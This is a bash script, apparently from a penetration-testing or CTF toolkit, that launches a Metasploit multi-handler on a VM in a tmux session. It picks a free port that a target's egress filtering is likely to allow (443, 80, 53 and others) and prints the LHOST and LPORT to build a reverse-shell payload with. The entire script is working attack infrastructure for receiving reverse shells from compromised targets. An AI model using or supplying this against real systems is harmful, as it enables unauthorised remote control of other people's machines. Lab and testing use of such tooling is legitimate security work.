#!/usr/bin/env bash
# Launch a Metasploit multi-handler on the VM on the first FREE egress-friendly port.
#
# Why: reverse shells must ride ports the TARGET's egress allows (ufw OUT often narrows to
# 80/443/etc), and the obvious port is frequently already taken by the attacker's own staging
# listener. This picks the LPORT so the handler never fails to bind on a taken port nor
# silently binds a filtered high port, then starts msfconsole in a tmux session named
# `msf` ON THE VM and prints the LPORT to build the payload with.
#
# Usage: bash scripts/vm-handler.sh <lhost> [tmux-session] [payload]
#   bash scripts/vm-handler.sh 192.168.128.212
#   bash scripts/vm-handler.sh 192.168.128.212 msf linux/x64/shell_reverse_tcp
# VM_SH overridable (default /root/vm.sh, same convention as vm-rsh.sh: invoked via `bash`).
set -uo pipefail
VM_SH="${VM_SH:-/root/vm.sh}"
LHOST="${1:?usage: vm-handler.sh <lhost> [tmux-session] [payload]}"
SESS="${2:-msf}"
PAYLOAD="${3:-generic/shell_reverse_tcp}"
PORTS="443 80 53 8000 8080"

vm() { bash "$VM_SH" "$1"; }

LISTEN="$(vm "ss -ltn")" || { echo "vm-handler: cannot reach VM via ${VM_SH}" >&2; exit 1; }
FREE=""
for p in $PORTS; do
  if ! grep -q ":${p} " <<<"$LISTEN"; then FREE="$p"; break; fi
done
if [ -z "$FREE" ]; then
  echo "vm-handler: all egress-friendly ports busy (${PORTS}) - free one and re-run" >&2
  exit 1
fi

vm "tmux has-session -t ${SESS} 2>/dev/null || tmux new-session -d -s ${SESS} bash" \
  || { echo "vm-handler: could not create tmux session '${SESS}' on the VM" >&2; exit 1; }
vm "tmux has-session -t ${SESS} 2>/dev/null" \
  || { echo "vm-handler: session '${SESS}' did not persist" >&2; exit 1; }
vm "tmux send-keys -t ${SESS}:0 \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD ${PAYLOAD}; set LHOST ${LHOST}; set LPORT ${FREE}; set ExitOnSession false; run -j'\" Enter" \
  || { echo "vm-handler: send-keys to '${SESS}' failed" >&2; exit 1; }
echo "LPORT=${FREE}"
echo "LHOST=${LHOST}"
echo "handler: tmux session '${SESS}' on the VM (attach: bash ${VM_SH} 'tmux attach -t ${SESS}')"
